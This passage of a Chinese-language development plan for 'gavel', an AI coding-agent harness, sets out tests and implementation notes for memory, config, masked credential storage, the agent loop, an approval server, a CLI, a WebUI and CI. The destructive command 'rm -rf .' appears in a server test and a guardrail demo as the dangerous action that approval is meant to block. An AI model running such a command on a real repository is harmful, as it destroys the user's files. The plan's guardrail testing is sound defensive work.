func TestGreenOutputNoFailure(t *testing.T) {
	fs := Parse("gotest", "ok  \tgithub.com/x/y\t0.001s", 0)
	if len(fs) != 0 { t.Fatalf("全绿应无失败，got %+v", fs) }
}

func contains(s, sub string) bool { return len(s) >= len(sub) && (s == sub || len(s) > 0 && (index(s, sub) >= 0)) }
func index(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ { if s[i:i+len(sub)] == sub { return i } }
	return -1
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/feedback/`
Expected: FAIL（undefined: Parse）

- [ ] **Step 3: 写最小实现**

实现要点（`internal/feedback/parser.go`）：
- `Parse("gotest", out, code)`：逐行扫描；`--- FAIL: <name>` 开始收集；行匹配 `^\s*([\w./-]+_test\.go):(\d+):\s*(.*)$` → File/Line/Message；退出码非 0 且无结构化失败 → 单个 `KindUnknown` 失败（Message=输出尾部 500 字符）
- `Parse("pytest", out, code)`：行匹配 `([\w./-]+\.py):(\d+):` 或 `E   assert`；`AssertionError`/`assert` → KindAssert；`SyntaxError|NameError|ImportError` → KindCompile；`Timeout|timed out` → KindTimeout；`ModuleNotFoundError|No module named` → KindEnv；其余 KindUnknown
- 分类辅助：`classify(message string) Kind`

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/feedback/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/feedback/
git commit -m "feat(feedback): go test/pytest 输出解析 + 失败分类（编译/断言/超时/环境/未知）"
```

---

### Task 8: 记忆存储（会话 / 约定 / 指纹）

**Files:**
- Create: `internal/memory/store.go`
- Test: `internal/memory/store_test.go`

**Interfaces:**
- Consumes: 无
- Produces:
```go
package memory

// Store 是泛型 JSON KV 落盘：key 形如 "session:<id>"、"hint:<repoHash>"。
type Store struct{ dir string }
func NewStore(dir string) *Store
func (s *Store) Put(key string, v any) error
func (s *Store) Get(key string, out any) (bool, error)
func (s *Store) Delete(key string) error
func (s *Store) List(prefix string) ([]string, error)
```

- [ ] **Step 1: 写失败测试**

`internal/memory/store_test.go`:
```go
package memory

import "testing"

func TestPutGetRoundtrip(t *testing.T) {
	s := NewStore(t.TempDir())
	type hint struct{ Note string }
	if err := s.Put("hint:abc", hint{Note: "测试命令已确认"}); err != nil { t.Fatal(err) }
	var got hint
	ok, err := s.Get("hint:abc", &got)
	if err != nil || !ok { t.Fatalf("ok=%v err=%v", ok, err) }
	if got.Note != "测试命令已确认" { t.Fatalf("got %+v", got) }
}

func TestDeleteAndList(t *testing.T) {
	s := NewStore(t.TempDir())
	_ = s.Put("session:1", map[string]any{"x": 1})
	_ = s.Put("session:2", map[string]any{"x": 2})
	ls, err := s.List("session:")
	if err != nil || len(ls) != 2 { t.Fatalf("got %v err=%v", ls, err) }
	if err := s.Delete("session:1"); err != nil { t.Fatal(err) }
	ls, _ = s.List("session:")
	if len(ls) != 1 { t.Fatalf("删除后应剩 1，got %v", ls) }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/memory/`
Expected: FAIL（undefined: NewStore）

- [ ] **Step 3: 写最小实现**

`internal/memory/store.go`：
- `Put`：`json.Marshal` → 文件名 `sha256(key)[:16].json` + 索引文件记录 key→file 映射（或直接 `url.QueryEscape(key)+".json"`，取后者更简单）；`os.MkdirAll(dir)`
- `Get`：读文件 `json.Unmarshal`；不存在 → `(false, nil)`
- `Delete`：`os.Remove`（不存在不报错）；`List`：`os.ReadDir` 过滤前缀

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/memory/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/memory/
git commit -m "feat(memory): 泛型 KV 落盘（会话/约定/指纹 统一存储）"
```

---

### Task 9: 配置加载

**Files:**
- Create: `internal/config/config.go`
- Test: `internal/config/config_test.go`

**Interfaces:**
- Consumes: 无
- Produces:
```go
package config

type Config struct {
	BaseURL     string `yaml:"base_url"`
	Model       string `yaml:"model"`
	MaxTurns    int    `yaml:"max_turns"`
	TimeoutSec  int    `yaml:"timeout_seconds"`
	PolicyPath  string `yaml:"policy_path"`
}

func Default() Config // BaseURL=https://api.deepseek.com, Model=deepseek-chat, MaxTurns=20, TimeoutSec=900
func Load(path string) (*Config, error) // 文件不存在 → 默认值；存在则覆盖
```

- [ ] **Step 1: 写失败测试**

`internal/config/config_test.go`:
```go
package config

import (
	"os"
	"path/filepath"
	"testing"
)

func TestDefaultDeepSeek(t *testing.T) {
	c := Default()
	if c.BaseURL != "https://api.deepseek.com" || c.Model != "deepseek-chat" { t.Fatalf("%+v", c) }
}

func TestLoadOverridesAndMissingFileFallsBack(t *testing.T) {
	c, err := Load(filepath.Join(t.TempDir(), "nope.yaml"))
	if err != nil || c.MaxTurns != 20 { t.Fatalf("缺失文件应回退默认: %+v err=%v", c, err) }
	dir := t.TempDir()
	p := filepath.Join(dir, "gavel.yaml")
	_ = os.WriteFile(p, []byte("model: deepseek-reasoner\nmax_turns: 5\n"), 0o644)
	c, err = Load(p)
	if err != nil || c.Model != "deepseek-reasoner" || c.MaxTurns != 5 { t.Fatalf("%+v err=%v", c, err) }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/config/`
Expected: FAIL（undefined: Default）

- [ ] **Step 3: 写最小实现**

`internal/config/config.go`：`Default()` 返回固定结构体；`Load` 用 `yaml.Unmarshal` 覆盖非零字段（先读默认再 Unmarshal）。

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/config/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/config/
git commit -m "feat(config): YAML 配置加载 + DeepSeek 默认值"
```

---

### Task 10: 凭据安全存储（keyring + .env + 掩码）

**Files:**
- Create: `internal/secret/secret.go`、`internal/secret/keyring.go`、`internal/secret/dotenv.go`
- Test: `internal/secret/secret_test.go`

**Interfaces:**
- Consumes: `go-keyring`（外部依赖，仅 keyring.go 使用）
- Produces:
```go
package secret

type Provider interface {
	Name() string
	Get() (string, error)   // 不存在 → ("", ErrNotFound)
	Set(key string) error
	Clear() error
}

var ErrNotFound = errors.New("secret not found")

func Chain(providers ...Provider) Provider // Get 依次尝试，Set/Clear 对第一个可用者操作
func KeyringProvider() Provider            // service="gavel", user="default"（go-keyring）
func DotenvProvider(path string) Provider  // KEY=value 单行文件
func Mask(s string) string                 // 长度>10: 前3+...+"*"+后4；否则 "****"
func Fingerprint(s string) string          // sha256 hex 前 8 位
```

- [ ] **Step 1: 写失败测试**

`internal/secret/secret_test.go`:
```go
package secret

import (
	"path/filepath"
	"testing"
)

type fakeProv struct{ v string; name string }
func (f *fakeProv) Name() string { return f.name }
func (f *fakeProv) Get() (string, error) { if f.v == "" { return "", ErrNotFound }; return f.v, nil }
func (f *fakeProv) Set(k string) error { f.v = k; return nil }
func (f *fakeProv) Clear() error { f.v = ""; return nil }

func TestChainFallsBack(t *testing.T) {
	c := Chain(&fakeProv{name: "a"}, &fakeProv{name: "b", v: "sk-1234567890abcd"})
	got, err := c.Get()
	if err != nil || got != "sk-1234567890abcd" { t.Fatalf("%v %v", got, err) }
}

func TestMaskNeverShowsPlaintext(t *testing.T) {
	m := Mask("sk-1234567890abcdef")
	if m == "sk-1234567890abcdef" || len(m) > 12 { t.Fatalf("mask=%q", m) }
	if Fingerprint("sk-abc") == "" || len(Fingerprint("sk-abc")) != 8 { t.Fatal("指纹应为 8 位 hex") }
}

func TestDotenvRoundtrip(t *testing.T) {
	p := filepath.Join(t.TempDir(), ".env")
	d := DotenvProvider(p)
	if err := d.Set("sk-secret-value"); err != nil { t.Fatal(err) }
	got, err := d.Get()
	if err != nil || got != "sk-secret-value" { t.Fatalf("%v %v", got, err) }
	if err := d.Clear(); err != nil { t.Fatal(err) }
	if _, err := d.Get(); err != ErrNotFound { t.Fatal("清除后应 ErrNotFound") }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/secret/`
Expected: FAIL（undefined: Chain / Mask / Fingerprint / DotenvProvider）

- [ ] **Step 3: 写最小实现**

- `secret.go`：`Chain`（Get 遍历；Set/Clear 用第一个 Get 成功的 provider，全部失败则报错）；`Mask`：`len<=6 → "******"`；否则 `s[:3]+"..."+s[len-4:]`（仅回显前后缀，永不回显全量）；`Fingerprint`：`fmt.Sprintf("%x", sha256.Sum256([]byte(s)))[:8]`
- `keyring.go`：`go-keyring` 的 `Set/Get/Delete`；`Get` 的 `ErrNotFound` 映射（`keyring.ErrNotFound` → 本包 ErrNotFound）
- `dotenv.go`：读写单行 `GAVEL_API_KEY=<value>`；无文件 → ErrNotFound；写入用 `0600` 权限

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/secret/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/secret/
git commit -m "feat(secret): keyring/.env 链式 Provider + 掩码 + 指纹"
```

---

### Task 11: Agent 主循环（决策封装 + 停机判断）

**Files:**
- Create: `internal/core/session.go`、`internal/core/loop.go`
- Test: `internal/core/loop_test.go`

**Interfaces:**
- Consumes: `llm.Client`（T2）、`tools.Registry`（T4）、`govern.Check/Policy/Manager`（T5/T6）、`feedback.Parse`（T7）、`memory.Store`（T8）
- Produces:
```go
package core

type State string
const (StateRunning State = "running"; StateCompleted State = "completed"; StateFailed State = "failed"; StateTerminated State = "terminated")

type Step struct {
	Seq int; Decision string; Rule string
	ToolName string; Args map[string]any
	Result string; Feedback string
}

type Session struct {
	ID, Repo, Task, TestCmd string
	State State; Steps []Step
	MaxTurns int
}

type Runner struct {
	LLM llm.Client
	Tools *tools.Registry
	Guard func(govern.GuardContext, govern.Action) govern.Verdict // 注入 Check，测试可替换
	HITL *govern.Manager
	Policy govern.Policy
	ApprovalTimeout time.Duration
	MaxTurns int
	TimeBudget time.Duration
	Store *memory.Store
	Feedback func(format, out string, code int) []feedback.TestFailure // 注入，测试可替换
	ApprovalDecider func(ctx context.Context, ap *govern.Approval) govern.ApprovalStatus // 测试注入自动 deny
}

func (r *Runner) Run(ctx context.Context, sess *Session) error
// 循环：组装消息 → LLM → 逐 toolCall：护栏 → approval 则 HITL 等待（超时自动拒绝）
// → Dispatch → run_test 则解析反馈回灌 → 全绿 Completed / 预算耗尽 Failed / 连续 3 次相同失败 Failed
```

- [ ] **Step 1: 写失败测试**

`internal/core/loop_test.go`:
```go
package core

import (
	"context"
	"testing"
	"time"

	"github.com/166176/harness/internal/feedback"
	"github.com/166176/harness/internal/govern"
	"github.com/166176/harness/internal/llm"
	"github.com/166176/harness/internal/memory"
	"github.com/166176/harness/internal/tools"
)

func TestLoopFixFailingTestEndToEnd(t *testing.T) {
	mock := &llm.ScriptedMock{Steps: []llm.Completion{
		{Message: llm.Message{Role: llm.RoleAssistant, ToolCalls: []llm.ToolCall{{ID: "1", Name: "write_file", Arguments: `{"path":"calc.go","content":"fixed"}`}}}},
		{Message: llm.Message{Role: llm.RoleAssistant, ToolCalls: []llm.ToolCall{{ID: "2", Name: "run_test", Arguments: `{}`}}}},
		{Message: llm.Message{Role: llm.RoleAssistant, Content: "all green", Done: true}},
	}}
	root := t.TempDir()
	reg := tools.RegistryOf(tools.FileTools(root))
	reg2 := append([]tools.Tool{}, tools.FileTools(root)...)
	_ = reg2
	// run_test 注入假执行器，第二次返回全绿
	runs := 0
	runner := &fakeTestRunner{onRun: func(cmd string) (string, int) {
		runs++
		if runs == 1 { return "--- FAIL: TestCalc (0.00s)\n    calc_test.go:12: want 3, got 2\nFAIL", 1 }
		return "ok", 0
	}}
	r := &Runner{
		LLM: mock,
		Tools: tools.RegistryOf(append(tools.FileTools(root), tools.TestTool(runner, root, "go test ./..."))),
		Guard: func(gc govern.GuardContext, a govern.Action) govern.Verdict { return govern.Check(govern.DefaultPolicy(), gc, a) },
		HITL: govern.NewManager(),
		Policy: govern.DefaultPolicy(),
		ApprovalTimeout: 50 * time.Millisecond,
		MaxTurns: 5,
		TimeBudget: time.Minute,
		Store: memory.NewStore(t.TempDir()),
		Feedback: feedback.Parse,
		ApprovalDecider: func(_ context.Context, ap *govern.Approval) govern.ApprovalStatus {
			_ = ap // 测试环境自动拒绝
			return govern.Denied
		},
	}
	sess := &Session{ID: "s1", Repo: root, Task: "修复失败测试", TestCmd: "go test ./...", MaxTurns: 5}
	if err := r.Run(context.Background(), sess); err != nil { t.Fatal(err) }
	if sess.State != StateCompleted { t.Fatalf("应为 completed，got %s", sess.State) }
	// 反馈闭环断言：第二轮 run_test 的反馈必须包含结构化失败
	found := false
	for _, st := range sess.Steps {
		if st.ToolName == "run_test" && st.Feedback != "" && contains(st.Feedback, "calc_test.go") { found = true }
	}
	if !found { t.Fatal("run_test 失败反馈未回灌（反馈闭环失效）") }
}

type fakeTestRunner struct{ onRun func(cmd string) (string, int) }

func (f *fakeTestRunner) Run(_ context.Context, _, cmd string, _ int) (string, string, int, error) {
	out, code := f.onRun(cmd)
	return out, "", code, nil
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/core/`
Expected: FAIL（undefined: Runner / Session）

- [ ] **Step 3: 写最小实现**

`internal/core/session.go`：State/Step/Session 类型定义。
`internal/core/loop.go`：实现 §6.5 伪代码。关键点：
- 每轮组装消息：system 提示（含任务、repo、工具说明）+ 最近 5 轮 + 最新反馈
- 解析 `Completion.ToolCalls` 的 `Arguments`（JSON → `map[string]any`）
- 分发前 `r.Guard(govern.GuardContext{RepoRoot: sess.Repo}, govern.Action{...})`：`Deny` → 记录 Step 并回灌拒绝消息；`Approval` → `r.HITL.Create` + `ApprovalDecider` 等待，`Approved` 才执行，否则回灌拒绝
- `run_test` 结果：正则提取 `exit=(\d+)`，调 `r.Feedback("gotest", out, code)`（解析格式由会话 TestCmd 含 "pytest" 时切 pytest），Feedback 存入 Step 并拼进下轮消息
- 停机：退出码 0 且无失败 → Completed；`MaxTurns`/`TimeBudget` 耗尽 → Failed；连续 3 轮相同失败指纹（Message 哈希）→ Failed
- 会话 JSON 落盘 `r.Store.Put("session:"+sess.ID, sess)`

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/core/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/core/
git commit -m "feat(core): 自研 agent 主循环 - 决策/分发/护栏/反馈回灌/停机"
```

---

### Task 12: HTTP 服务（REST + SSE + 静态内嵌）

**Files:**
- Create: `internal/server/server.go`、`internal/server/handlers.go`
- Test: `internal/server/server_test.go`

**Interfaces:**
- Consumes: `govern.Manager`（T6）、`memory.Store`（T8）、`secret.Provider`（T10）
- Produces:
```go
package server

type Deps struct {
	HITL *govern.Manager
	Store *memory.Store
	Secret secret.Provider
	Demo func(ctx context.Context) []demo.Result // demo.Result 见 T13；本任务用接口类型避免循环依赖:
	DemoFunc func(ctx context.Context) ([]map[string]any, error)
}
func New(d Deps) http.Handler
// 路由：
// GET  /api/sessions              → 会话 id 列表
// GET  /api/sessions/{id}         → Session JSON
// GET  /api/approvals/pending     → 所有 pending 审批列表
// POST /api/approvals/{id}        → body {"decision":"approved|denied"} → 调 HITL.Decide
// GET  /api/events                → SSE（推送 pending/decided/session 事件）
// GET  /api/key/status            → {provider, mask, fingerprint}（无明文）
// GET  /api/demo                  → 执行 DemoFunc 返回三场景结果
// GET  /                          → 内嵌 webui/dist 静态文件（go:embed，构建期不存在时返回 503 提示先构建前端）
```

- [ ] **Step 1: 写失败测试**

`internal/server/server_test.go`:
```go
package server

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/166176/harness/internal/govern"
	"github.com/166176/harness/internal/memory"
	"github.com/166176/harness/internal/secret"
)

type memSecret struct{ v string }
func (m *memSecret) Name() string { return "mem" }
func (m *memSecret) Get() (string, error) { return m.v, nil }
func (m *memSecret) Set(k string) error { m.v = k; return nil }
func (m *memSecret) Clear() error { m.v = ""; return nil }

func TestKeyStatusMasksSecret(t *testing.T) {
	h := New(Deps{HITL: govern.NewManager(), Store: memory.NewStore(t.TempDir()), Secret: &memSecret{v: "sk-abcdefghij1234"}})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, httptest.NewRequest("GET", "/api/key/status", nil))
	if rr.Code != 200 { t.Fatalf("code=%d", rr.Code) }
	var body map[string]string
	_ = json.Unmarshal(rr.Body.Bytes(), &body)
	if body["secret"] == "sk-abcdefghij1234" { t.Fatal("接口泄露明文") }
	if body["mask"] == "" { t.Fatal("掩码为空") }
}

func TestDecideApproval(t *testing.T) {
	m := govern.NewManager()
	ap, err := m.Create("s1", govern.Action{Tool: "run_shell", Args: map[string]any{"command": "rm -rf ."}}, "dangerous", "risk")
	if err != nil { t.Fatal(err) }
	h := New(Deps{HITL: m, Store: memory.NewStore(t.TempDir()), Secret: &memSecret{}})
	body := bytes.NewBufferString(`{"decision":"approved"}`)
	req := httptest.NewRequest("POST", "/api/approvals/"+ap.ID, body)
	req.SetPathValue("id", ap.ID)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != 200 { t.Fatalf("code=%d body=%s", rr.Code, rr.Body.String()) }
	st := m.Await(t.Context(), ap.ID, 10*time.Millisecond)
	if st != govern.Approved { t.Fatalf("应为 approved，got %s", st) }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/server/`
Expected: FAIL（undefined: New / Deps）

- [ ] **Step 3: 写最小实现**

- `server.go`：`http.NewServeMux` 注册路由；静态文件 `//go:embed all:webui/dist`（构建期无 dist 时用占位目录 `webui/dist/index.html`，由 T15 生成）
- `handlers.go`：JSON 编解码；SSE 用 `flusher` 推送 `data: {...}\n\n`，响应头 `Content-Type: text/event-stream` + `X-Accel-Buffering: no`；`/api/key/status` 只回 `{provider, mask, fingerprint}`；`/api/approvals/{id}` 调 `HITL.Decide(id, "approved"/"denied", "webui")`

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/server/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/server/
git commit -m "feat(server): REST+SSE 审批接口 + key 掩码状态 + 静态内嵌骨架"
```

---

### Task 13: 机制演示（§A.6 三场景）

**Files:**
- Create: `internal/demo/demo.go`
- Test: `internal/demo/demo_test.go`

**Interfaces:**
- Consumes: `core.Runner`（T11）、`llm.ScriptedMock`（T2）
- Produces:
```go
package demo

type Result struct { Name string; Pass bool; Trace []string }

// Run 在纯 MockLLM 下确定性执行三个场景，不联网、不读凭据。
func Run(ctx context.Context) []Result
```

- [ ] **Step 1: 写失败测试**

`internal/demo/demo_test.go`:
```go
package demo

import (
	"context"
	"testing"
)

func TestAllThreeScenariosPass(t *testing.T) {
	rs := Run(context.Background())
	if len(rs) != 3 { t.Fatalf("应有 3 个场景，got %d", len(rs)) }
	for _, r := range rs {
		if !r.Pass { t.Fatalf("场景 %s 失败: %v", r.Name, r.Trace) }
	}
}

func TestScenarioNames(t *testing.T) {
	rs := Run(context.Background())
	names := map[string]bool{}
	for _, r := range rs { names[r.Name] = true }
	for _, want := range []string{"guardrail-intercept", "feedback-loop", "hitl-timeout-autodeny"} {
		if !names[want] { t.Fatalf("缺少场景 %s", want) }
	}
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/demo/`
Expected: FAIL（undefined: Run）

- [ ] **Step 3: 写最小实现**

三个场景（全程 ScriptedMock + 假执行器）：
1. `guardrail-intercept`：mock 发 `run_shell: "rm -rf ."` → 断言 `govern.Check` 返回 Approval → Trace 记录命中规则 → Pass
2. `feedback-loop`：mock 序列 = [write_file, run_test, write_file(修复)]；假执行器第一次返回失败输出、第二次全绿；断言 Session 的 Step 中 run_test 的 Feedback 含解析出的文件/行号，且 mock 收到含该反馈的消息后发出了修复动作（断言第二步 write_file 的 args 与反馈一致）→ Pass
3. `hitl-timeout-autodeny`：mock 发危险命令 → ApprovalTimeout=50ms、ApprovalDecider=Await → 断言状态 Timeout 且工具**未执行**（假执行器调用数为 0）→ Pass

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/demo/`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/demo/
git commit -m "feat(demo): 机制演示三场景 - 护栏拦截/反馈闭环/HITL 超时自动拒绝"
```

---

### Task 14: CLI 装配（cmd/gavel）

**Files:**
- Create: `cmd/gavel/main.go`、`internal/cli/keycmd.go`
- Test: `internal/cli/cli_test.go`

**Interfaces:**
- Consumes: `core.Runner`（T11）、`server.New`（T12）、`demo.Run`（T13）、`secret`（T10）、`config`（T9）
- Produces: 可执行文件 `gavel`（子命令：`version / key set|status|clear / demo [--json] / serve [--port] / run [flags]`）

- [ ] **Step 1: 写失败测试**

`internal/cli/cli_test.go`:
```go
package cli

import (
	"testing"
)

func TestParseKeyStatusShowsNoPlaintext(t *testing.T) {
	out, code := RunForTest([]string{"gavel", "key", "status"}, fakeSecretProvider{})
	if code != 0 { t.Fatalf("exit=%d out=%s", code, out) }
	if contains(out, "sk-secret-value-1234") { t.Fatal("status 回显明文") }
	if !contains(out, "mask") { t.Fatalf("out=%s", out) }
}

func TestDemoExitZero(t *testing.T) {
	_, code := RunForTest([]string{"gavel", "demo"}, fakeSecretProvider{})
	if code != 0 { t.Fatalf("demo 应退出 0") }
}
```

（`RunForTest(args, prov)` 是 main 的测试入口：解析子命令、注入 fake secret provider，输出捕获到 string。）

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/cli/`
Expected: FAIL（undefined: RunForTest）

- [ ] **Step 3: 写最小实现**

- `main.go`：`os.Exit(cli.Run(os.Args[1:], os.Stdin, os.Stdout, os.Stderr))`
- `cli.Run`：switch args[0]；`key set` 用 `golang.org/x/term.ReadPassword`（非 TTY 时报错引导）；`key status` 输出 `provider/mask/fingerprint`；`demo --json` 输出 `json.Marshal(demo.Run(ctx))`
- `run` 命令：flag 解析 → config.Load → 组装 Runner（真实 LLM 适配器见 Task 16）→ 执行并输出会话摘要
- 错误退出码按 SPEC §3.2：0 全绿 / 1 预算耗尽 / 2 人工终止 / 3 配置错误

- [ ] **Step 4: 运行确认通过**

Run: `go test ./internal/cli/ ./...`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add cmd/ internal/cli/
git commit -m "feat(cli): gavel 子命令装配（version/key/demo/serve/run）"
```

---

### Task 15: WebUI（Open Design · shadcn/ui）

**Files:**
- Create: `webui/`（Vite + React + TS + shadcn/ui，Open Design skill 流程）
- Test: `webui/src/lib/__tests__/api.test.ts`（vitest）

**Interfaces:**
- Consumes: T12 API 契约（`/api/approvals/pending`、`POST /api/approvals/{id}`、`/api/events`、`/api/key/status`、`/api/demo`）
- Produces: `webui/dist/` 构建产物（被 `internal/server` go:embed）

- [ ] **Step 1: 写失败测试**

`webui/src/lib/__tests__/api.test.ts`（关键逻辑与 UI 解耦）:
```ts
import { describe, it, expect } from "vitest";
import { parseEvent, maskLabel } from "../api";

describe("parseEvent", () => {
  it("解析 pending 事件", () => {
    expect(parseEvent('{"type":"pending","id":"a1","rule":"dangerous"}')).toEqual({ type: "pending", id: "a1", rule: "dangerous" });
  });
});

describe("maskLabel", () => {
  it("掩码永不等于原文", () => {
    const s = "sk-abcdefghij1234";
    expect(maskLabel(s)).not.toBe(s);
  });
});
```

- [ ] **Step 2: 运行确认失败**

Run: `cd webui && npx vitest run`
Expected: FAIL（模块不存在）

- [ ] **Step 3: 写最小实现**

- `src/lib/api.ts`：`fetch` 封装 + SSE `EventSource` + 2s 轮询兜底（EventSource onerror 后启动 setInterval）；`parseEvent`、`maskLabel`
- 页面组件（shadcn/ui：Card/Badge/Button/Dialog/Tabs）：
  - `ApprovalsPage`：pending 列表（动作、规则、风险、倒计时）+ 批准/拒绝/拒绝并终止按钮
  - `SessionsPage`：会话列表 + Step 流水（判定徽标：allow 绿 / deny 红 / approval 黄）
  - `KeyPanel`：展示 `/api/key/status`（掩码）
  - `DemoPage`：`/api/demo` 三场景 PASS/FAIL 卡片
- 构建：`npm run build` → `webui/dist`

- [ ] **Step 4: 运行确认通过**

Run: `cd webui && npx vitest run && npm run build`
Expected: 测试 PASS、构建产出 `dist/index.html`

- [ ] **Step 5: Commit**

```bash
git add webui/
git commit -m "feat(webui): Open Design(shadcn/ui) 审批控制台 + 会话监控 + 演示页"
```

---

### Task 16: 分发 + CI + 文档

**Files:**
- Create: `internal/llm/openai.go`、`Dockerfile`、`.goreleaser.yaml`、`.github/workflows/ci.yml`、`.gitlab-ci.yml`、`README.md`
- Test: `internal/llm/openai_test.go`

**Interfaces:**
- Consumes: `llm.Client`（T2）、全部模块
- Produces: ghcr.io 镜像、双平台二进制、CI 流水线

- [ ] **Step 1: 写失败测试**

`internal/llm/openai_test.go`（用 httptest 假服务端验证请求构造与响应解析，不真联网）:
```go
package llm

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestOpenAIClientParsesToolCall(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer sk-test" { t.Fatal("缺认证头") }
		json.NewEncoder(w).Encode(map[string]any{
			"choices": []map[string]any{{"message": map[string]any{
				"role": "assistant",
				"tool_calls": []map[string]any{{"id": "c1", "function": map[string]any{"name": "read_file", "arguments": `{"path":"a.go"}`}}},
			}}},
		})
	}))
	defer srv.Close()
	c := NewOpenAIClient(srv.URL, "sk-test", "deepseek-chat")
	comp, err := c.Complete(context.Background(), []Message{{Role: RoleUser, Content: "hi"}}, nil)
	if err != nil { t.Fatal(err) }
	if len(comp.Message.ToolCalls) != 1 || comp.Message.ToolCalls[0].Name != "read_file" { t.Fatalf("%+v", comp) }
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test ./internal/llm/`
Expected: FAIL（undefined: NewOpenAIClient）

- [ ] **Step 3: 写最小实现**

- `openai.go`：`POST {base}/chat/completions`（body：model/messages/tools），`Authorization: Bearer <key>`，解析 `choices[0].message.tool_calls`；key 不落日志
- `Dockerfile`：
```dockerfile
# 阶段1 前端
FROM node:22-alpine AS webui
WORKDIR /app/webui
COPY webui/package*.json ./
RUN npm ci
COPY webui/ ./
RUN npm run build

# 阶段2 Go
FROM golang:1.23-alpine AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
COPY --from=webui /app/webui/dist ./webui/dist
RUN CGO_ENABLED=0 go build -o /gavel ./cmd/gavel

# 阶段3 运行时
FROM gcr.io/distroless/static-debian12
COPY --from=build /gavel /gavel
EXPOSE 8080
ENTRYPOINT ["/gavel", "serve", "--port", "8080"]
```
- `.goreleaser.yaml`：`builds: [{main: ./cmd/gavel, goos: [windows, linux, darwin], goarch: [amd64]}]`，archives 免 tar（windows exe）
- `.github/workflows/ci.yml`：job `unit-test`（`go test ./...` + `cd webui && npm ci && npx vitest run`）+ job `docker`（build + push ghcr.io/166176/harness）+ job `release`（goreleaser，tag 触发）
- `.gitlab-ci.yml`：job **`unit-test`**（镜像 golang:1.23，`go test ./...`）
- `README.md`：简介 / 安装 / 运行 / 分发命令 / 目录结构 / 安全边界说明 / key 在目标机的安全配置（六章必备）+ 第三方依赖与许可证列表（go-keyring MIT、yaml.v3 Apache-2.0、x/term BSD、shadcn/ui MIT）

- [ ] **Step 4: 运行确认通过**

Run: `go test ./... && docker build -t harness-test .`
Expected: 全绿且镜像构建成功

- [ ] **Step 5: Commit**

```bash
git add internal/llm/openai.go Dockerfile .goreleaser.yaml .github/ .gitlab-ci.yml README.md
git commit -m "feat(dist): OpenAI 兼容适配器 + Docker/goreleaser + CI(unit-test) + README"
```

---

### Task 17: 样例仓库与真实 LLM 验收（人工，不进 CI）

**Files:**
- Create: `testdata/sample-repo/`（calc.go 种子 bug + calc_test.go 失败断言 + go.mod）

**Interfaces:**
- Consumes: `gavel` 可执行（T14/T16）
- Produces: 真实 LLM 验收步骤文档（写入 README「验收」小节）

- [ ] **Step 1: 准备种子 bug 仓库**

`testdata/sample-repo/calc.go`:
```go
package calc

// Add 有意写错：返回 2 而非 a+b（种子 bug，供 gavel 修复演示）。
func Add(a, b int) int { return 2 }
```
`testdata/sample-repo/calc_test.go`:
```go
package calc

import "testing"

func TestAdd(t *testing.T) {
	if Add(1, 2) != 3 { t.Fatalf("Add(1,2)=%d, want 3", Add(1, 2)) }
}
```

- [ ] **Step 2: 手动验收（人工执行，记录到 AGENT_LOG）**

Run: `gavel key set`（录入 DeepSeek key，隐藏输入）
Then: `gavel run --repo testdata/sample-repo --test "go test ./..." --task "修复失败测试"`
Expected: 会话从失败走到 `completed`；WebUI（`gavel serve`）中可见全部 Step 与护栏判定

- [ ] **Step 3: Commit**

```bash
git add testdata/sample-repo/ README.md
git commit -m "test: 种子 bug 样例仓库 + 真实 LLM 验收步骤"
```

---

## 自审记录（writing-plans Self-Review）

1. **Spec 覆盖**：§3 功能规约 → T2–T14；§4 非功能 → T10（安全）、T12（可观测 SSE）、T16（性能无关）；§5 架构 → T11；§6 领域机制 → T5/T6/T7/T13；§7 凭据分发 → T10/T16；§9 验收 → T13 演示 + T16 CI + T17 真实验收；§A.6 → T13。无缺口。
2. **占位符扫描**：无 TBD/TODO；每个代码步骤给出实际代码或明确实现要点。
3. **类型一致性**：`llm.Client/Message/ToolCall/ToolSpec/Completion`（T2）被 T3/T4/T11/T13/T16 一致引用；`govern.Action/Verdict/Manager/Approval`（T5/T6）被 T11/T12/T13 一致引用；`tools.Registry/RegistryOf/FileTools/TestTool/ShellTool`（T3/T4）被 T11/T13 一致引用；`feedback.Parse`（T7）被 T11 注入；`secret.Provider/Mask/Fingerprint`（T10）被 T12/T14 一致引用。一致。
